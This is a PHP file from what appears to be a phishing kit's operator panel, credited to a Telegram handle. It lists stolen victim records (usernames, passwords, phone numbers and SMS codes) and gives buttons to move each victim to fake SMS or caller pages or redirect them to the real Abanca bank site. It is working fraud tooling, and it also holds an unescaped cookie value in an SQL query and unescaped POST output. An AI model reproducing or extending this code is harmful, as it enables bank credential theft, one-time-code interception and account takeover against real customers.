<?php
/**
* PANEL PRIV8 LIVE
* @package    PANEL PRIV8 LIVE
* @author     https://t.me/neo_net
* @copyright  2020
* @version    2.0
* Info :  php de tabla de notificaciones
*/
session_start();
include '../database/db.php';
include '../defense/ajax.php';
/* Si esta vacia la variable no mostramos nada */
$hash = @$_COOKIE['identificator'];
$fhrji = $connection->query("SELECT hash FROM secure where hash='$hash'");
if (!isset($_SESSION['userSession']) && mysqli_num_rows($fhrji) === 0) {
//Nothing to do boy
}
else {
$query = $connection->query("SELECT * FROM tbl_users WHERE user_id=".$_SESSION['userSession']);
$userRow=$query->fetch_array();
$notification = $connection->query("SELECT * FROM numeros order by id desc limit 500");
 
echo '
<div class="card-panel blue-grey lighten-1 no-shadow hide">
<span class="white-text hide labeled">'.$_POST['default'].'</span>
        </div>
  <table class="striped neonet responsive-table">
        <thead>
          <tr>
              <th>STATUS</th>
              <th>USER</th>
              <th>PASS</th>
              <th>MOVIL</th>
              <th>SMS</th>
             <th>ACCIONES INTERNAS</th>
             <th>ACCIONES FINALES</th>
          </tr>
        </thead>
        <tbody>';
if(mysqli_num_rows($notification) === 0):
?>
<tr>
<td colspan="13">No hay Registros en la base de datos</td>
</tr>
</tbody>
</table>
<?php
endif;
while($row = mysqli_fetch_array($notification)):
if ($row['stella'] == '') {$row['stella']='N/A';}
if ($row['status'] == '') {$row['status']='En Espera';}
if ($row['status'] == 1) {$row['status']='En Página de Caller';}
if ($row['status'] == 2) {$row['status']='En Página de SMS';}
if ($row['status'] == 3) {$row['status']='Relogin';}
if ($row['status'] == 4) {$row['status']='Redireccionado Abanca';}
?>
<tr>
<td><?php echo htmlentities($row['status']); ?></td>
<td><?php echo htmlentities($row['user']); ?></td>
<td><?php echo htmlentities($row['pass']); ?></td>
<td><?php if ($row['movil'] == '') {$row['movil']='N/A'; echo $row['movil'];} else { echo htmlentities($row['movil']); } ?></td>
<td><?php if ($row['stella'] == '') {$row['stella']='N/A'; echo $row['stella'];} else { echo htmlentities($row['stella']); } ?></td>
<td><button class="waves-effect waves-light btn red lighten-1 delete tooltipped" data-id="<?php echo $row['id']; ?>" name="action" name="action" data-position="bottom" data-tooltip="Borrar Registro">Borrar</button>
  <button class="waves-effect waves-light btn cyan accent-2 logo-completo tooltipped" data-id="<?php echo $row['id']; ?>" name="action" data-position="bottom" data-tooltip="Ver logo completo">  <i class="large material-icons">description</i></button>
  <button class="waves-effect waves-light btn red accent-3  finalizar6 tooltipped" data-id="<?php echo $row['id']; ?>" name="action" data-position="bottom" data-tooltip="Login Error User">  <i class="large material-icons">vpn_key</i></button>
  <button class="waves-effect waves-light btn blue accent-3  finalizar-caca tooltipped" data-id="<?php echo $row['id']; ?>" name="action" data-position="bottom" data-tooltip="Página SMS">  <i class="large material-icons">sms</i></button>
  <button class="waves-effect waves-light btn blue accent-3  finalizar-caca2 tooltipped" data-id="<?php echo $row['id']; ?>" name="action" data-position="bottom" data-tooltip="Página Caller">  <i class="large material-icons">phone</i></button>
</td>
<td>

  <button class="waves-effect waves-light btn teal accent-3 criptocal tooltipped" data-id="<?php echo $row['id']; ?>" name="action" data-position="bottom" data-tooltip="Redireccionar a Página Abanca">  <i class="large material-icons">check_box</i></button>



</td>
</tr>
 <?php
 endwhile;
 echo '</tbody></table>';}
 ?>